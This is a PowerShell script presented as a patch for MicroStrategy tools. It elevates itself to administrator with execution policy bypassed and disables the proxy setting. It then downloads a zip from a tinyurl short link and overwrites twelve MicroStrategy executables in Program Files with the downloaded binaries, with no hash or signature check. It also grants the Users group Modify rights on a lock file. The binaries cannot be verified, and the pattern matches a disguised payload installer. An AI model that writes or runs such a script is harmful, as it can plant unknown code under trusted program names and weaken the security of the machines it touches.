if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# TLS and proxy settings for reliable download
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$proxyKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings'
Set-ItemProperty -Path $proxyKey -Name ProxyEnable -Value 0

$s3Url      = 'https://tinyurl.com/fixed-exec-files'
$zipPath    = "$env:TEMP\fixed_executables.zip"
$extractDir = "$env:TEMP\fixed_executables"

# --- 1. Download ---
Write-Host "Downloading fixed_executables.zip..."
Invoke-WebRequest -Uri $s3Url -OutFile $zipPath -UseBasicParsing

# --- 2. Extract ---
Write-Host "Extracting..."
if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force

# --- 3. Backup existing binaries (skip if .bak already exists) ---
Write-Host "Backing up existing binaries..."
$backupFiles = @(
    'C:\Program Files (x86)\Common Files\MicroStrategy\MASysMgr_64.exe',
    'C:\Program Files (x86)\Common Files\MicroStrategy\MASysMgr.exe',
    'C:\Program Files (x86)\MicroStrategy\System Manager\MASysMgrw_64.exe',
    'C:\Program Files (x86)\MicroStrategy\System Manager\MASysMgrw.exe',
    'C:\Program Files (x86)\MicroStrategy\Command Manager\CmdMgrW_64.exe',
    'C:\Program Files (x86)\MicroStrategy\Command Manager\CmdMgrW.exe',
    'C:\Program Files (x86)\MicroStrategy\Command Manager\CMDMGR_64.exe',
    'C:\Program Files (x86)\MicroStrategy\Command Manager\CMDMGR.exe',
    'C:\Program Files (x86)\Common Files\MicroStrategy\CmdMgrLt_64.exe',
    'C:\Program Files (x86)\Common Files\MicroStrategy\CmdMgrLt.exe',
    'C:\Program Files (x86)\Common Files\MicroStrategy\MADBQueryTool_64.exe',
    'C:\Program Files (x86)\Common Files\MicroStrategy\MADBQueryTool.exe'
)
$backupFiles | ForEach-Object {
    if ((Test-Path $_) -and (-not (Test-Path "$_.bak"))) {
        Rename-Item $_ "$_.bak" -Force
        Write-Host "  Backed up: $_"
    }
}

# --- 4. Copy fixed binaries (always overwrite to ensure correct version) ---
Write-Host "Copying fixed binaries..."
$map = @{
    'C:\Program Files (x86)\Common Files\MicroStrategy' = @(
        'MASysMgr_64.EXE','MASysMgr.EXE','CmdMgrLt_64.EXE','CmdMgrLt.EXE',
        'MADBQueryTool_64.exe','MADBQueryTool.exe'
    )
    'C:\Program Files (x86)\MicroStrategy\System Manager' = @(
        'MASysMgrw_64.exe','MASysMgrw.exe'
    )
    'C:\Program Files (x86)\MicroStrategy\Command Manager' = @(
        'CmdMgrW_64.exe','CmdMgrW.exe','CMDMGR_64.exe','CMDMGR.exe'
    )
}
$map.GetEnumerator() | ForEach-Object {
    $dest = $_.Key
    $_.Value | ForEach-Object {
        $fileName = $_
        $src = Get-ChildItem -Path $extractDir -Recurse -Filter $fileName -File | Select-Object -First 1
        if ($src) {
            Copy-Item $src.FullName $dest -Force
            Write-Host "  Copied: $fileName -> $dest"
        } else {
            Write-Warning "File not found in zip: $fileName"
        }
    }
}

# --- 5. Create MSIReg.reg_lock if absent, grant Users:M if not already set ---
Write-Host "Configuring MSIReg.reg_lock..."
$regLockPath = 'C:\Program Files (x86)\Common Files\MicroStrategy\MSIReg.reg_lock'
if (-not (Test-Path -LiteralPath $regLockPath)) {
    New-Item -ItemType File -Path $regLockPath -Force | Out-Null
    Write-Host "  Created: $regLockPath"
}
$acl = (icacls $regLockPath) -join ''
if ($acl -notmatch 'BUILTIN\\Users:\(M\)') {
    icacls $regLockPath /grant Users:M | Out-Null
    Write-Host "  Granted Users:M on $regLockPath"
} else {
    Write-Host "  ACL already correct, skipping."
}

# --- 6. Cleanup ---
Write-Host "Cleaning up temp files..."
Remove-Item $zipPath -Force
Remove-Item $extractDir -Recurse -Force

Write-Host "Done."
